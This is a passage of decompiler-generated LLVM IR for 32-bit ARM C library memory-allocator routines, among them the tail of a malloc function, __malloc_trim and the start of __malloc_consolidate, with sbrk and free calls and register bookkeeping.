  br label %dec_label_pc_b9b8

dec_label_pc_b9b8:                                ; preds = %dec_label_pc_b994, %dec_label_pc_b99c
  %v0_b9bc = phi i32 [ 0, %dec_label_pc_b994 ], [ %v0_b9bc.pre, %dec_label_pc_b99c ]
  %v0_b9b8 = load i32, i32* @r4, align 4
  store i32 %v0_b9b8, i32* @r7, align 4
  store i32 %v0_b9bc, i32* @r5, align 4
  br label %dec_label_pc_b9c0

dec_label_pc_b9c0:                                ; preds = %dec_label_pc_b968, %dec_label_pc_b970, %dec_label_pc_b958, %dec_label_pc_b9b8
  %v0_b9c0 = load i32, i32* %r0.global-to-local, align 4
  %v7_b9c0 = icmp eq i32 %v0_b9c0, -1
  br i1 %v7_b9c0, label %dec_label_pc_ba44, label %dec_label_pc_b9c8

dec_label_pc_b9c8:                                ; preds = %dec_label_pc_b9c0
  %v1_b9c8 = load i32, i32* @r5, align 4
  %v2_b9c8 = add i32 %v1_b9c8, %v0_b9c0
  %v0_b9cc = load i32, i32* @r7, align 4
  %v2_b9cc = sub i32 %v2_b9c8, %v0_b9cc
  %v1_b9d0 = or i32 %v2_b9cc, 1
  %v2_b9d4 = add i32 %v0_b9cc, 4
  %v3_b9d4 = inttoptr i32 %v2_b9d4 to i32*
  store i32 %v1_b9d0, i32* %v3_b9d4, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_b9e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b9e0, i32* @r6, align 4
  %v1_b9e4 = add i32 %v4_b9e0, 872
  %v2_b9e4 = inttoptr i32 %v1_b9e4 to i32*
  %v3_b9e4 = load i32, i32* %v2_b9e4, align 4
  %v0_b9e8 = load i32, i32* @r8, align 4
  %v2_b9e8 = icmp eq i32 %v0_b9e8, 0
  %v0_b9ec = load i32, i32* @r5, align 4
  %v2_b9ec = add i32 %v0_b9ec, %v3_b9e4
  store i32 %v2_b9ec, i32* %r3.global-to-local, align 4
  store i32 %v2_b9ec, i32* %v2_b9e4, align 4
  %v0_b9f4 = load i32, i32* @r7, align 4
  %v1_b9f4 = load i32, i32* @r6, align 4
  %v2_b9f4 = add i32 %v1_b9f4, 44
  %v3_b9f4 = inttoptr i32 %v2_b9f4 to i32*
  store i32 %v0_b9f4, i32* %v3_b9f4, align 4
  br i1 %v2_b9e8, label %dec_label_pc_ba44, label %dec_label_pc_b9fc

dec_label_pc_b9fc:                                ; preds = %dec_label_pc_b9c8
  %v0_ba00 = load i32, i32* @r8, align 4
  %v1_ba00 = add i32 %v0_ba00, -12
  %v1_ba04 = and i32 %v1_ba00, -8
  store i32 %v3_b7cc, i32* %ip.global-to-local, align 4
  %v2_ba0c = add i32 %v1_ba04, %v3_b7cc
  store i32 %v2_ba0c, i32* %r1.global-to-local, align 4
  %v2_ba10 = icmp ugt i32 %v1_ba04, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_ba18 = or i32 %v1_ba04, 1
  store i32 %v1_ba18, i32* %r3.global-to-local, align 4
  store i32 %v1_ba18, i32* %v2_b7d8, align 4
  %v0_ba20 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba20 = load i32, i32* %r1.global-to-local, align 4
  %v2_ba20 = add i32 %v1_ba20, 8
  %v3_ba20 = inttoptr i32 %v2_ba20 to i32*
  store i32 %v0_ba20, i32* %v3_ba20, align 4
  %v0_ba24 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba24 = load i32, i32* %r1.global-to-local, align 4
  %v2_ba24 = add i32 %v1_ba24, 4
  %v3_ba24 = inttoptr i32 %v2_ba24 to i32*
  store i32 %v0_ba24, i32* %v3_ba24, align 4
  br i1 %v2_ba10, label %dec_label_pc_ba2c, label %dec_label_pc_ba44

dec_label_pc_ba2c:                                ; preds = %dec_label_pc_b9fc
  %v0_ba2c = load i32, i32* @r6, align 4
  %v1_ba2c = add i32 %v0_ba2c, 836
  %v2_ba2c = inttoptr i32 %v1_ba2c to i32*
  %v3_ba2c = load i32, i32* %v2_ba2c, align 4
  store i32 %v3_ba2c, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_ba34 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba34 = add i32 %v0_ba34, 8
  store i32 %v1_ba34, i32* @r0, align 4
  store i32 -1, i32* %v2_ba2c, align 4
  %v0_ba3c = call i32 @free()
  store i32 %v0_ba3c, i32* %r0.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r4, align 4
  %v1_ba40 = load i32, i32* @r6, align 4
  %v2_ba40 = add i32 %v1_ba40, 836
  %v3_ba40 = inttoptr i32 %v2_ba40 to i32*
  store i32 %v0_ba40, i32* %v3_ba40, align 4
  br label %dec_label_pc_ba44

dec_label_pc_ba44:                                ; preds = %.thread34, %dec_label_pc_b9fc, %dec_label_pc_b9c8, %dec_label_pc_b9c0, %dec_label_pc_ba2c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r0.global-to-local, align 4
  %v4_ba4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_ba4c, i32* %lr.global-to-local, align 4
  %v1_ba50 = add i32 %v4_ba4c, 872
  store i32 %v1_ba50, i32* %r1.global-to-local, align 4
  %v1_ba54 = inttoptr i32 %v1_ba50 to i32*
  %v2_ba54 = load i32, i32* %v1_ba54, align 4
  store i32 %v2_ba54, i32* %r1.global-to-local, align 4
  %v3_ba54 = add i32 %v4_ba4c, 876
  %v4_ba54 = inttoptr i32 %v3_ba54 to i32*
  %v5_ba54 = load i32, i32* %v4_ba54, align 4
  store i32 %v5_ba54, i32* %r3.global-to-local, align 4
  %v1_ba5c = add i32 %v4_ba4c, 868
  %v2_ba5c = inttoptr i32 %v1_ba5c to i32*
  %v3_ba5c = load i32, i32* %v2_ba5c, align 4
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  %v1_ba60 = add i32 %v4_ba4c, 884
  %v2_ba60 = inttoptr i32 %v1_ba60 to i32*
  %v3_ba60 = load i32, i32* %v2_ba60, align 4
  store i32 %v3_ba60, i32* %r2.global-to-local, align 4
  %v2_ba64 = add i32 %v3_ba5c, %v2_ba54
  store i32 %v2_ba64, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_ba54, %v5_ba54
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_ba44
  store i32 %v2_ba54, i32* %v4_ba54, align 4
  %v0_ba6c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ba6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_ba44, %bb165
  %v1_ba6c = phi i32 [ %v3_ba60, %dec_label_pc_ba44 ], [ %v1_ba6c.pre, %bb165 ]
  %v4_ba70 = phi i32 [ %v2_ba64, %dec_label_pc_ba44 ], [ %v0_ba6c.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_ba70, %v1_ba6c
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_ba70 = load i32, i32* %lr.global-to-local, align 4
  %v6_ba70 = add i32 %v5_ba70, 884
  %v7_ba70 = inttoptr i32 %v6_ba70 to i32*
  store i32 %v4_ba70, i32* %v7_ba70, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_ba74 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba74 = add i32 %v0_ba74, 44
  %v2_ba74 = inttoptr i32 %v1_ba74 to i32*
  %v3_ba74 = load i32, i32* %v2_ba74, align 4
  store i32 %v3_ba74, i32* %ip.global-to-local, align 4
  %v1_ba78 = add i32 %v3_ba74, 4
  %v2_ba78 = inttoptr i32 %v1_ba78 to i32*
  %v3_ba78 = load i32, i32* %v2_ba78, align 4
  store i32 %v1_b68c, i32* %r1.global-to-local, align 4
  %v1_ba80 = and i32 %v3_ba78, -4
  store i32 %v1_ba80, i32* %r3.global-to-local, align 4
  %v3_ba84 = icmp ult i32 %v1_ba80, %v1_b68c
  br i1 %v3_ba84, label %dec_label_pc_bab0, label %dec_label_pc_ba8c

dec_label_pc_ba8c:                                ; preds = %bb168
  %v0_ba8c = load i32, i32* @sl, align 4
  %v2_ba8c = sub i32 %v1_ba80, %v0_ba8c
  %v2_ba90 = add i32 %v0_ba8c, %v3_ba74
  store i32 %v2_ba90, i32* %r1.global-to-local, align 4
  %v1_ba94 = or i32 %v2_ba8c, 1
  store i32 %v1_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = or i32 %v0_ba8c, 1
  store i32 %v1_ba98, i32* %r2.global-to-local, align 4
  %v1_ba9c = add i32 %v3_ba74, 8
  store i32 %v1_ba9c, i32* %r0.global-to-local, align 4
  store i32 %v1_ba98, i32* %v2_ba78, align 4
  %v0_baa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_baa4 = load i32, i32* %lr.global-to-local, align 4
  %v2_baa4 = add i32 %v1_baa4, 44
  %v3_baa4 = inttoptr i32 %v2_baa4 to i32*
  store i32 %v0_baa4, i32* %v3_baa4, align 4
  %v0_baa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_baa8 = load i32, i32* %r1.global-to-local, align 4
  %v2_baa8 = add i32 %v1_baa8, 4
  %v3_baa8 = inttoptr i32 %v2_baa8 to i32*
  store i32 %v0_baa8, i32* %v3_baa8, align 4
  br label %dec_label_pc_bac0

dec_label_pc_bab0:                                ; preds = %bb157, %bb168, %dec_label_pc_b88c
  %v0_bab0 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_bab8 = inttoptr i32 %v0_bab0 to i32*
  store i32 12, i32* %v2_bab8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bac0

dec_label_pc_bac0:                                ; preds = %bb151, %bb150, %dec_label_pc_ba8c, %dec_label_pc_b6d4, %dec_label_pc_bab0
  %v0_bac0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bac0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bac4

dec_label_pc_bac4:                                ; preds = %.thread1, %dec_label_pc_b6a0, %.thread121, %dec_label_pc_b510, %dec_label_pc_b504, %dec_label_pc_b36c, %dec_label_pc_b2f0, %dec_label_pc_bac0
  store i32 %v2_b218, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r2, align 4
  %v4_bad4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 24) to i32*), align 4
  store i32 %v4_bad4, i32* @ip, align 4
  store i32 47840, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_bad4)
  br label %dec_label_pc_bae0

dec_label_pc_bae0:                                ; preds = %dec_label_pc_b250, %dec_label_pc_bac4
  %v0_bae0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bae0, i32* %r0.global-to-local, align 4
  store i32 %v3_b1ec, i32* @r4, align 4
  store i32 %v6_b1ec, i32* @r5, align 4
  store i32 %v9_b1ec, i32* @r6, align 4
  store i32 %v12_b1ec, i32* @r7, align 4
  store i32 %v15_b1ec, i32* @r8, align 4
  store i32 %v18_b1ec, i32* @sb, align 4
  store i32 %v21_b1ec, i32* @sl, align 4
  store i32 %v24_b1ec, i32* @fp, align 4
  store i32 %v27_b1ec, i32* @lr, align 4
  ret i32 %v0_bae0

; uselistorder directives
  uselistorder i32 %v0_ba8c, { 1, 0, 2 }
  uselistorder i32 %v3_ba74, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ba70, { 1, 0 }
  uselistorder i32 %v2_ba54, { 2, 0, 1, 3 }
  uselistorder i32 %v4_ba4c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_ba04, { 1, 2, 0 }
  uselistorder i32 %v0_b9cc, { 1, 0 }
  uselistorder i32 %v0_b9c0, { 1, 0 }
  uselistorder i32 %v2_b9b0, { 1, 0 }
  uselistorder i32 %v2_b940, { 2, 1, 0 }
  uselistorder i32 %v2_b928, { 1, 2, 0, 3 }
  uselistorder i32 %v2_b920, { 1, 0, 2 }
  uselistorder i32 %v1_b91c, { 2, 1, 0 }
  uselistorder i32 %v0_b91c, { 3, 1, 2, 0 }
  uselistorder i32 %v1_b900, { 1, 0 }
  uselistorder i32 %v2_b8d8, { 1, 0 }
  uselistorder i32 %v3_b8cc, { 1, 0, 2 }
  uselistorder i32 %v2_b8ac, { 1, 0, 2 }
  uselistorder i32* %v2_b8a4, { 1, 0, 2 }
  uselistorder i32 %v0_b88c, { 1, 0 }
  uselistorder i32 %v6_b868, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_b854, { 2, 1, 0 }
  uselistorder i32 %v0_b83c, { 1, 0 }
  uselistorder i32 %v2_b7f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b7f4, { 1, 0 }
  uselistorder i32 %v3_b7cc, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_b7ac, { 1, 0, 2 }
  uselistorder i32 %v2_b794, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b73c, { 2, 1, 0 }
  uselistorder i32 %v6_b730, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_b70c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b68c, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_b684, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b680, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_b66c, { 1, 0 }
  uselistorder i32 %v7_b62c, { 1, 0 }
  uselistorder i32 %v4_b62c, { 1, 0 }
  uselistorder i32 %v0_b5fc, { 1, 0 }
  uselistorder i32 %v2_b5d0, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_b5cc54, { 1, 0 }
  uselistorder i32 %v1_b598, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_b580., { 1, 2, 0 }
  uselistorder i32 %v0_b588, { 0, 1, 3, 2 }
  uselistorder i32 %v1_b588, { 1, 0 }
  uselistorder i32 %v3_b568, { 1, 0 }
  uselistorder i32 %v4_b564, { 1, 0, 2 }
  uselistorder i32 %v1_b4d4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_b52c, { 1, 0 }
  uselistorder i32 %v1_b510, { 1, 0 }
  uselistorder i32 %v1_b3b0, { 1, 0 }
  uselistorder i32 %v0_b4f0, { 2, 0, 1, 3 }
  uselistorder i32 %v3_b4b8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_b54c.pre, { 1, 2, 0 }
  uselistorder i32 %v0_b494, { 2, 1, 0 }
  uselistorder i32 %v3_b488, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_b3a8, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_b450, { 1, 0 }
  uselistorder i32 %v3_b444, { 1, 0 }
  uselistorder i32 %v0_b450, { 1, 0 }
  uselistorder i32 %v3_b428, { 0, 2, 3, 1 }
  uselistorder i32 %v2_b418, { 1, 0, 2 }
  uselistorder i32 %v3_b3d0, { 2, 1, 0 }
  uselistorder i32 %v0_b3c0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_b390, { 1, 0 }
  uselistorder i32 %v1_b344, { 2, 1, 0, 3 }
  uselistorder i32 %v0_b340, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_b2e4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_b2d8, { 1, 0 }
  uselistorder i32 %v3_b2a8, { 1, 0 }
  uselistorder i32 %v0_b29c, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_b27c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_b270, { 1, 0 }
  uselistorder i32 %v0_b248, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 13, 14, 15, 16, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 27, 28, 29, 1, 2, 30, 31, 32, 33, 34, 35, 36, 37, 38, 43, 39, 40, 41, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 63, 71, 58, 59, 60, 61, 62, 64, 65, 66, 67, 0, 68, 69, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 38, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 48, 49, 50, 51, 52, 53, 54, 55, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 39, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 18, 3, 5, 6, 7, 58, 51, 48, 55, 49, 50, 53, 52, 59, 54, 56, 8, 57, 10, 9, 14, 12, 11, 13, 16, 15, 19, 17, 24, 20, 21, 1, 22, 23, 25, 26, 27, 30, 31, 28, 29, 36, 33, 32, 34, 35, 37, 42, 38, 39, 40, 41, 44, 43, 47, 46, 45, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 38, 39, 40, 41, 42, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 31, 30, 23, 19, 24, 20, 21, 22, 25, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_bae0, { 1, 0 }
  uselistorder label %dec_label_pc_bac4, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_bac0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_bab0, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_ba44, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_b9c0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_b9b8, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_b88c, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_b7c0, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_b678, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_b5cc, { 1, 0 }
  uselistorder label %dec_label_pc_b5d4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b598, { 1, 0 }
  uselistorder label %dec_label_pc_b54c, { 1, 0 }
  uselistorder label %dec_label_pc_b4e0, { 1, 0 }
  uselistorder label %dec_label_pc_b4dc, { 1, 0 }
  uselistorder label %dec_label_pc_b488, { 1, 0 }
  uselistorder label %dec_label_pc_b474, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b43c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_b428, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_baf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_baf4:
  %v0_baf4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_baf4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_baf4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_baf4, %bb
  %v10_bb08 = phi i32 [ %arg1, %dec_label_pc_baf4 ], [ 0, %bb ]
  ret i32 %v10_bb08

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_bb0c = add i32 %arg2, 44
  %v2_bb0c = inttoptr i32 %v1_bb0c to i32*
  %v3_bb0c = load i32, i32* %v2_bb0c, align 4
  %v12_bb10 = load i32, i32* @r7, align 4
  %v1_bb14 = add i32 %v3_bb0c, 4
  %v2_bb14 = inttoptr i32 %v1_bb14 to i32*
  %v3_bb14 = load i32, i32* %v2_bb14, align 4
  %v1_bb18 = add i32 %arg2, 860
  %v2_bb18 = inttoptr i32 %v1_bb18 to i32*
  %v3_bb18 = load i32, i32* %v2_bb18, align 4
  store i32 %v3_bb18, i32* @r4, align 4
  %v1_bb1c = and i32 %v3_bb14, -4
  store i32 %v1_bb1c, i32* @r6, align 4
  %v1_bb20 = add i32 %v1_bb1c, -17
  %v2_bb24 = add i32 %v1_bb20, %v3_bb18
  store i32 %arg2, i32* @r5, align 4
  %v2_bb30 = sub i32 %v2_bb24, %arg1
  store i32 %v3_bb18, i32* %r1.global-to-local, align 4
  %v2_bb38 = udiv i32 %v2_bb30, %v3_bb18
  %v1_bb3c = add i32 %v2_bb38, -1
  store i32 %v1_bb3c, i32* %r0.global-to-local, align 4
  %v2_bb40 = mul i32 %v1_bb3c, %v3_bb18
  store i32 %v2_bb40, i32* @r7, align 4
  %v2_bb44 = icmp eq i32 %v2_bb40, 0
  store i1 %v2_bb44, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_bb40, 1
  br i1 %tmp8, label %dec_label_pc_bbac, label %dec_label_pc_bb4c

dec_label_pc_bb4c:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bb50 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_bb50, i32* %r0.global-to-local, align 4
  %v0_bb54 = load i32, i32* @r5, align 4
  %v1_bb54 = add i32 %v0_bb54, 44
  %v2_bb54 = inttoptr i32 %v1_bb54 to i32*
  %v3_bb54 = load i32, i32* %v2_bb54, align 4
  %v0_bb58 = load i32, i32* @r6, align 4
  %v2_bb58 = add i32 %v0_bb58, %v3_bb54
  %v9_bb5c = icmp eq i32 %v1_bb50, %v2_bb58
  store i1 %v9_bb5c, i1* @cpsr_z, align 1
  store i32 %v1_bb50, i32* @r4, align 4
  br i1 %v9_bb5c, label %dec_label_pc_bb68, label %dec_label_pc_bbac

dec_label_pc_bb68:                                ; preds = %dec_label_pc_bb4c
  %v0_bb68 = load i32, i32* @r7, align 4
  %v1_bb68 = sub i32 0, %v0_bb68
  store i32 %v1_bb68, i32* %r0.global-to-local, align 4
  %v1_bb6c = call i32 @__GI_sbrk(i32 %v1_bb68)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bb74 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_bb74, i32* %r0.global-to-local, align 4
  %v7_bb78 = icmp eq i32 %v1_bb74, -1
  store i1 %v7_bb78, i1* @cpsr_z, align 1
  br i1 %v7_bb78, label %dec_label_pc_bbac, label %dec_label_pc_bb80

dec_label_pc_bb80:                                ; preds = %dec_label_pc_bb68
  %v0_bb80 = load i32, i32* @r4, align 4
  %v2_bb80 = sub i32 %v0_bb80, %v1_bb74
  store i32 %v2_bb80, i32* %r0.global-to-local, align 4
  %v9_bb80 = icmp eq i32 %v0_bb80, %v1_bb74
  store i1 %v9_bb80, i1* @cpsr_z, align 1
  br i1 %v9_bb80, label %dec_label_pc_bbac, label %dec_label_pc_bb88

dec_label_pc_bb88:                                ; preds = %dec_label_pc_bb80
  %v0_bb88 = load i32, i32* @r5, align 4
  %v1_bb88 = add i32 %v0_bb88, 872
  %v2_bb88 = inttoptr i32 %v1_bb88 to i32*
  %v3_bb88 = load i32, i32* %v2_bb88, align 4
  %v1_bb8c = load i32, i32* @r6, align 4
  %v2_bb8c = sub i32 %v1_bb8c, %v2_bb80
  %v1_bb90 = add i32 %v0_bb88, 44
  %v2_bb90 = inttoptr i32 %v1_bb90 to i32*
  %v3_bb90 = load i32, i32* %v2_bb90, align 4
  store i32 %v3_bb90, i32* %r1.global-to-local, align 4
  %v2_bb94 = sub i32 %v3_bb88, %v2_bb80
  %v1_bb98 = or i32 %v2_bb8c, 1
  store i32 %v1_bb98, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_bb94, i32* %v2_bb88, align 4
  %v0_bba4 = load i32, i32* @r2, align 4
  %v1_bba4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bba4 = add i32 %v1_bba4, 4
  %v3_bba4 = inttoptr i32 %v2_bba4 to i32*
  store i32 %v0_bba4, i32* %v3_bba4, align 4
  %v1_bbb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb0

dec_label_pc_bbac:                                ; preds = %dec_label_pc_bb4c, %dec_label_pc_bb80, %dec_label_pc_bb68, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bb88, %dec_label_pc_bbac
  %v1_bbb8 = phi i32 [ %v1_bbb8.pre, %dec_label_pc_bb88 ], [ 0, %dec_label_pc_bbac ]
  store i32 %v12_bb10, i32* @r7, align 4
  ret i32 %v1_bbb8

; uselistorder directives
  uselistorder i1 %v7_bb78, { 1, 0 }
  uselistorder i32 %v1_bb74, { 2, 1, 0, 3 }
  uselistorder i32 %v3_bb18, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bbac, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_bbbc = load i32, i32* @r4, align 4
  store i32 %v3_bbbc, i32* %stack_var_-36, align 4
  %v0_bbc0 = load i32, i32* @r0, align 4
  %v1_bbc0 = inttoptr i32 %v0_bbc0 to i32*
  %v2_bbc0 = load i32, i32* %v1_bbc0, align 4
  store i32 %v2_bbc0, i32* %r3.global-to-local, align 4
  %v2_bbc4 = icmp eq i32 %v2_bbc0, 0
  store i32 %v0_bbc0, i32* @r4, align 4
  br i1 %v2_bbc4, label %dec_label_pc_bcfc.preheader, label %dec_label_pc_bbd8

dec_label_pc_bcfc.preheader:                      ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_bd0425 = add i32 %v0_bbc0, 52
  store i32 %v1_bd0425, i32* %r3.global-to-local, align 4
  %v2_bd0c26 = add i32 %v0_bbc0, 60
  %v3_bd0c27 = inttoptr i32 %v2_bd0c26 to i32*
  store i32 %v1_bd0425, i32* %v3_bd0c27, align 4
  %v0_bd1028 = load i32, i32* %r3.global-to-local, align 4
  %v2_bd1029 = add i32 %v0_bd1028, 12
  %v3_bd1030 = inttoptr i32 %v2_bd1029 to i32*
  store i32 %v0_bd1028, i32* %v3_bd1030, align 4
  br label %dec_label_pc_bcfc.dec_label_pc_bcfc_crit_edge

dec_label_pc_bbd8:                                ; preds = %entry
  %v1_bbd8 = and i32 %v2_bbc0, -3
  %v3_bbdc = udiv i32 %v2_bbc0, 8
